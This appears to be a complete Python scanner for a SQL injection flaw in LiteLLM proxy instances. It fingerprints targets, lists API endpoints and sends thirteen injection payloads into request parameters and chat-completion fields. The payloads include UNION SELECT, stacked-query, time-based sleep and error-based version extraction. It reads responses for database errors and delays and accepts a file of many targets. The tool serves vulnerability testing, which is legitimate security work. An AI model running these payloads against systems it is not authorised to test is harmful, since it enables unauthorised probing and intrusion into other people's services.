#!/usr/bin/env python3
"""
CVE-2026-42208 - LiteLLM SQL Injection Scanner
Detects SQL injection in BerriAI LiteLLM proxy instances.
"""

import argparse
import json
import re
import sys
from datetime import datetime
from urllib.parse import urljoin, urlparse

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = WHITE = RESET = ""
    class Style:
        RESET_ALL = ""

VERSION = "1.0.0"

BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════╗
║  CVE-2026-42208 - LiteLLM SQL Injection     ║
║  Scanner v{VERSION}                              ║
╚══════════════════════════════════════════════╝{Style.RESET_ALL}
"""

SQL_ERRORS = [
    "sql syntax", "sqlite3", "postgresql", "mysql", "ORA-", "SQL Server",
    "syntax error", "unclosed quotation", "PDOException", "SQLSTATE",
    "column.*does not exist", "table.*does not exist", "operational error",
    "database is locked", "disk i/o error", "malformed database",
]

LITELLM_ENDPOINTS = [
    ("/health/liveliness", "GET", "Health check endpoint"),
    ("/health/readiness", "GET", "Readiness check"),
    ("/v1/models", "GET", "List models"),
    ("/models", "GET", "Models list"),
    ("/v1/chat/completions", "POST", "Chat completions"),
    ("/chat/completions", "POST", "Chat completions"),
    ("/v1/completions", "POST", "Text completions"),
    ("/v1/embeddings", "POST", "Embeddings"),
    ("/key/generate", "POST", "Key generation"),
    ("/key/info", "GET", "Key info"),
    ("/team/info", "GET", "Team info"),
    ("/user/info", "GET", "User info"),
    ("/model/info", "GET", "Model info"),
    ("/v1/model/info", "GET", "Model info"),
    ("/spend/logs", "GET", "Spend logs"),
    ("/global/spend/logs", "GET", "Global spend logs"),
    ("/global/spend/keys", "GET", "Key spending"),
    ("/global/spend/models", "GET", "Model spending"),
    ("/v1/spend/logs", "GET", "Spend logs"),
    ("/config", "GET", "Configuration"),
    ("/metrics", "GET", "Prometheus metrics"),
]

SQLI_PAYLOADS = [
    {"name": "single_quote", "value": "'", "desc": "Single quote injection"},
    {"name": "double_quote", "value": '"', "desc": "Double quote injection"},
    {"name": "or_true", "value": "' OR '1'='1", "desc": "OR true injection"},
    {"name": "union_select", "value": "' UNION SELECT NULL--", "desc": "UNION SELECT injection"},
    {"name": "comment_inject", "value": "test'--", "desc": "Comment injection"},
    {"name": "stacked_query", "value": "'; SELECT 1--", "desc": "Stacked query"},
    {"name": "sleep", "value": "' AND SLEEP(5)--", "desc": "Time-based blind"},
    {"name": "pg_sleep", "value": "'; SELECT pg_sleep(5)--", "desc": "PostgreSQL sleep"},
    {"name": "waitfor", "value": "'; WAITFOR DELAY '0:0:5'--", "desc": "MSSQL delay"},
    {"name": "benchmark", "value": "' AND BENCHMARK(5000000,SHA1('test'))--", "desc": "MySQL benchmark"},
    {"name": "error_based", "value": "' AND 1=CONVERT(int,(SELECT @@version))--", "desc": "Error-based extraction"},
    {"name": "parenthesis", "value": "') OR ('1'='1", "desc": "Parenthesis injection"},
    {"name": "backtick", "value": "` OR 1=1--", "desc": "Backtick injection"},
]


class LiteLLMScanner:
    def __init__(self, target, timeout=10):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "LiteLLM-Scanner/1.0 (Security Audit)",
            "Content-Type": "application/json",
        })
        self.findings = []
        self.is_litellm = False

    def add_finding(self, severity, category, title, detail="", url="", evidence=""):
        self.findings.append({
            "severity": severity,
            "category": category,
            "title": title,
            "detail": detail,
            "url": url,
            "evidence": evidence[:300],
            "timestamp": datetime.now().isoformat(),
        })

    def fingerprint(self):
        """Check if target is a LiteLLM instance."""
        print(f"\n  {Fore.CYAN}[*] Fingerprinting {self.target}...{Style.RESET_ALL}")

        # Check health endpoint
        for path in ["/health/liveliness", "/health/readiness"]:
            try:
                resp = self.session.get(f"{self.target}{path}", timeout=self.timeout)
                if resp.status_code == 200:
                    body = resp.text.lower()
                    if "litellm" in body or "healthy" in body:
                        self.is_litellm = True
                        print(f"  {Fore.GREEN}[+] LiteLLM confirmed via {path}{Style.RESET_ALL}")
                        break
            except:
                pass

        # Check response headers for LiteLLM signatures
        try:
            resp = self.session.get(f"{self.target}/", timeout=self.timeout)
            headers = {k.lower(): v for k, v in resp.headers.items()}
            server = headers.get("server", "")
            if "litellm" in server.lower() or "uvicorn" in server.lower():
                self.is_litellm = True
                print(f"  {Fore.GREEN}[+] LiteLLM detected via server header: {server}{Style.RESET_ALL}")
        except:
            pass

        # Try model listing
        for path in ["/v1/models", "/models"]:
            try:
                resp = self.session.get(f"{self.target}{path}", timeout=self.timeout)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if "data" in data:
                            self.is_litellm = True
                            models = [m.get("id", "") for m in data.get("data", [])]
                            print(f"  {Fore.GREEN}[+] LiteLLM confirmed via {path} ({len(models)} models){Style.RESET_ALL}")
                            if models:
                                print(f"      Models: {', '.join(models[:5])}{'...' if len(models) > 5 else ''}")
                            break
                    except:
                        pass
            except:
                pass

        if not self.is_litellm:
            print(f"  {Fore.YELLOW}[?] Could not confirm LiteLLM - scanning anyway{Style.RESET_ALL}")

        return self.is_litellm

    def discover_endpoints(self):
        """Discover available endpoints."""
        print(f"\n  {Fore.CYAN}[*] Discovering endpoints...{Style.RESET_ALL}")

        available = []
        for path, method, desc in LITELLM_ENDPOINTS:
            try:
                if method == "GET":
                    resp = self.session.get(f"{self.target}{path}", timeout=self.timeout, allow_redirects=False)
                else:
                    resp = self.session.post(f"{self.target}{path}", json={}, timeout=self.timeout, allow_redirects=False)

                status = resp.status_code
                if status != 404:
                    color = Fore.GREEN if status == 200 else Fore.YELLOW if status in (401, 403) else Fore.CYAN
                    print(f"  {color}[{status}] {path} ({desc}){Style.RESET_ALL}")
                    available.append((path, method, status, desc))
            except:
                pass

        return available

    def test_sqli(self, endpoints):
        """Test endpoints for SQL injection."""
        print(f"\n  {Fore.CYAN}[*] Testing SQL injection ({len(SQLI_PAYLOADS)} payloads)...{Style.RESET_ALL}")

        vulnerable = []

        for path, method, status, desc in endpoints:
            # Skip health endpoints
            if "health" in path:
                continue

            print(f"\n  {Fore.WHITE}Testing: {path}{Style.RESET_ALL}")

            for payload in SQLI_PAYLOADS:
                try:
                    # Test as query parameter
                    test_url = f"{self.target}{path}"
                    params = {"q": payload["value"], "search": payload["value"],
                             "model": payload["value"], "key": payload["value"]}

                    if method == "GET":
                        resp = self.session.get(test_url, params=params, timeout=self.timeout)
                    else:
                        # Also test in POST body
                        body = {"model": payload["value"], "messages": [
                            {"role": "user", "content": payload["value"]}
                        ]}
                        resp = self.session.post(test_url, json=body, timeout=self.timeout)

                    # Check for SQL errors in response
                    body_lower = resp.text.lower()
                    for error in SQL_ERRORS:
                        if re.search(error.lower(), body_lower):
                            vuln = {
                                "path": path,
                                "payload": payload["name"],
                                "payload_value": payload["value"],
                                "error": error,
                                "status": resp.status_code,
                                "evidence": resp.text[:200],
                            }
                            vulnerable.append(vuln)
                            print(f"  {Fore.RED}[SQLI] {payload['name']} in {path}{Style.RESET_ALL}")
                            print(f"        Error: {error}")
                            print(f"        Payload: {payload['value'][:50]}")
                            self.add_finding("CRITICAL", "SQL Injection",
                                           f"SQLi in {path} ({payload['name']})",
                                           detail=f"Error: {error}",
                                           url=f"{test_url}?q={payload['value'][:30]}",
                                           evidence=resp.text[:200])
                            break

                    # Check for time-based detection
                    if "sleep" in payload["name"].lower() or "waitfor" in payload["name"].lower() or "benchmark" in payload["name"].lower():
                        try:
                            import time
                            start = time.time()
                            if method == "GET":
                                resp = self.session.get(test_url, params=params, timeout=10)
                            else:
                                resp = self.session.post(test_url, json=body, timeout=10)
                            elapsed = time.time() - start

                            if elapsed > 4:
                                vuln = {
                                    "path": path,
                                    "payload": payload["name"],
                                    "time_delay": f"{elapsed:.1f}s",
                                    "type": "time-based blind",
                                }
                                vulnerable.append(vuln)
                                print(f"  {Fore.RED}[SQLI-TIME] {payload['name']} in {path} ({elapsed:.1f}s delay){Style.RESET_ALL}")
                                self.add_finding("CRITICAL", "SQL Injection (Time-based)",
                                               f"Time-based SQLi in {path}",
                                               detail=f"Delay: {elapsed:.1f}s with {payload['name']}")
                        except:
                            pass

                except requests.exceptions.Timeout:
                    if "sleep" in payload["name"] or "waitfor" in payload["name"]:
                        print(f"  {Fore.YELLOW}[?] Timeout on {payload['name']} - possible blind SQLi{Style.RESET_ALL}")
                except Exception:
                    pass

        return vulnerable

    def full_scan(self):
        """Run full scan."""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  FULL SCAN: {self.target}")
        print(f"  Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*60}{Style.RESET_ALL}")

        self.fingerprint()
        endpoints = self.discover_endpoints()
        self.test_sqli(endpoints)

        # Summary
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  SCAN SUMMARY")
        print(f"{'='*60}{Style.RESET_ALL}")
        print(f"  Target: {self.target}")
        print(f"  LiteLLM: {'Confirmed' if self.is_litellm else 'Unconfirmed'}")
        print(f"  Endpoints: {len(endpoints)}")
        print(f"  Findings: {len(self.findings)}")

        crit = sum(1 for f in self.findings if f["severity"] == "CRITICAL")
        high = sum(1 for f in self.findings if f["severity"] == "HIGH")
        if crit:
            print(f"  {Fore.RED}CRITICAL: {crit}{Style.RESET_ALL}")
        if high:
            print(f"  {Fore.RED}HIGH: {high}{Style.RESET_ALL}")

        for f in self.findings:
            color = {"CRITICAL": Fore.RED, "HIGH": Fore.RED, "MEDIUM": Fore.YELLOW}[f["severity"]]
            print(f"  {color}[{f['severity']}] {f['title']}{Style.RESET_ALL}")

    def export_json(self, filename):
        report = {
            "tool": "LiteLLM SQLi Scanner",
            "version": VERSION,
            "cve": "CVE-2026-42208",
            "target": self.target,
            "scan_time": datetime.now().isoformat(),
            "is_litellm": self.is_litellm,
            "findings": self.findings,
        }
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"\n  {Fore.GREEN}[+] Report saved to {filename}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-42208 - LiteLLM SQL Injection Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://target-litellm.com
  %(prog)s targets.txt
  %(prog)s https://target-litellm.com --json --output report.json
        """
    )

    parser.add_argument("target", help="Target URL or file with targets")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--json", action="store_true", help="JSON output")
    parser.add_argument("--output", help="Output filename")

    args = parser.parse_args()
    print(BANNER)

    if not HAS_REQUESTS:
        print(f"  {Fore.RED}[!] requests library required. Install: pip install requests{Style.RESET_ALL}")
        sys.exit(1)

    # Load targets
    targets = []
    try:
        with open(args.target) as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except (FileNotFoundError, IsADirectoryError):
        targets = [args.target]

    for target in targets:
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target

        scanner = LiteLLMScanner(target, timeout=args.timeout)
        scanner.full_scan()

        if args.output and len(targets) == 1:
            scanner.export_json(args.output)


if __name__ == "__main__":
    main()
